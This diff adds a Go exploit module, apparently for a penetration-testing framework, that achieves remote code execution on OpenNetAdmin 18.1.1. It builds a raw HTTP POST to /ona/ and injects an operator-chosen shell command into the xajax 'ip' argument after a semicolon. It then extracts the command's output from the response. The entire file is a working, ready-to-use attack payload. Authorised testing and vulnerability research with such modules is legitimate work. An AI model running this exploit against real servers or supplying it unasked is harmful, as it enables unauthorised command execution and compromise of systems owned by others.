@@ -1,0 +1,44 @@
+/*{
+Name: OpenNetAdminRCE
+Author: mattpascoe
+Ported By: TerminalJockey
+Date: 3/10/2021
+Description: Remote Code Execution vulnerability in OpenNetAdmin 18.1.1
+Type:Web
+Options:
+{
+	"Rhost":"",
+	"Rport":"",
+	"Dir":"",
+	"Cmd":""
+}
+}*/
+
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+)
+
+func main() {
+	conn, err := net.Dial("tcp", "{{.Rhost}}:{{.Rport}}")
+	if err != nil {
+		log.Println(err)
+	}
+	cmd := "{{.Cmd}}"
+	pload := "POST /ona/ HTTP/1.0\r\nContent-Length: 162\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nxajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";" + cmd + ";echo \"END\"&xajaxargs[]=ping"
+	
+	conn.Write([]byte(pload))
+
+	resp, err := ioutil.ReadAll(conn)
+	if err != nil {
+		log.Println(err)
+	}
+	begin := bytes.Index(resp, []byte("BEGIN"))
+	end := bytes.Index(resp, []byte("END"))
+	fmt.Println(string(resp[begin+5 : end]))
+}
